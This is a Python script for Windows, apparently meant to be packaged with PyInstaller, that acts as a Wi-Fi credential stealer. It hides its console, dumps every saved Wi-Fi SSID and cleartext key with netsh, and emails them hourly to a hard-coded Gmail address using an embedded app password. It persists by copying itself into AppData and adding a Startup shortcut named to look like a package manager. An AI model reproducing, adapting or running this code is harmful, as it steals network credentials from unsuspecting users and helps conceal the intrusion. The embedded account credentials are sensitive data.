import subprocess
import re
import smtplib
from email.message import EmailMessage
import time
import logging
import os
import winshell
from win32com.client import Dispatch
import shutil
import sys  # Add sys to use _MEIPASS

def run_wifi_extraction():
    def get_wifi_profiles():
        try:
            profiles_output = subprocess.run(
                ["netsh", "wlan", "show", "profiles"], 
                capture_output=True, 
                creationflags=subprocess.CREATE_NO_WINDOW
            ).stdout.decode("cp1252")
            profile_names = re.findall("All User Profile     : (.*)\r", profiles_output)
            return profile_names
        except Exception:
            return []

    def get_wifi_password(profile_name):
        try:
            profile_info = subprocess.run(
                ["netsh", "wlan", "show", "profile", profile_name, "key=clear"], 
                capture_output=True, 
                creationflags=subprocess.CREATE_NO_WINDOW
            ).stdout.decode("cp1252")
            if "Security key           : Absent" in profile_info:
                return None
            password = re.search("Key Content            : (.*)\r", profile_info)
            return password[1] if password else None
        except Exception:
            return None

    def prepare_email(wifi_list):
        try:
            email_message = "\n".join(f"SSID: {item['ssid']}, Password: {item['password']}" for item in wifi_list)
            email = EmailMessage()
            email["from"] = "thebabadoll432@gmail.com"
            email["to"] = "elizabethleemailhouse@gmail.com"
            email["subject"] = "WiFi SSIDs and Passwords"
            email.set_content(email_message)
            return email
        except Exception:
            return None

    def send_email(email):
        try:
            with smtplib.SMTP_SSL(host="smtp.gmail.com", port=465) as smtp:
                smtp.login("thebabadoll432@gmail.com", "jaof dvpr sipe kgmm")
                smtp.send_message(email)
        except Exception:
            pass

    # Main logic
    wifi_list = []
    profile_names = get_wifi_profiles()

    for name in profile_names:
        password = get_wifi_password(name)
        wifi_list.append({"ssid": name, "password": password})

    if wifi_list:
        email = prepare_email(wifi_list)
        if email:
            send_email(email)


def create_startup_shortcut():
    # Determine the path to the running .exe (whether it's from _MEIPASS or a direct path)
    if getattr(sys, 'frozen', False):  # Check if running as a PyInstaller executable
        source_exe_path = sys.executable  # The current running exe
    else:
        source_exe_path = os.path.abspath(__file__)  # In case it's running as a script

    # Create the MyApp folder in AppData\Local
    destination_folder = os.path.join(os.getenv('LOCALAPPDATA'), 'MyApp')
    os.makedirs(destination_folder, exist_ok=True)  # Ensure the directory exists

    # Set the destination path for the .exe
    destination_exe_path = os.path.join(destination_folder, os.path.basename(source_exe_path))

    # Copy the executable to the destination folder
    try:
        shutil.copy(source_exe_path, destination_exe_path)
    except Exception as e:
        #print(f"Error copying the file: {e}")
        pass

    # Create the startup shortcut
    startup_folder = winshell.startup()
    #shortcut_path = os.path.join(startup_folder, 'windows-security.lnk')
    shortcut_path = os.path.join(startup_folder, 'package-manager.lnk')
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.Targetpath = destination_exe_path  # The new path in MyApp folder
    shortcut.WorkingDirectory = os.path.dirname(destination_exe_path)
    shortcut.save()


# Call the functions
create_startup_shortcut()
while True:
    run_wifi_extraction()
    time.sleep(3600)




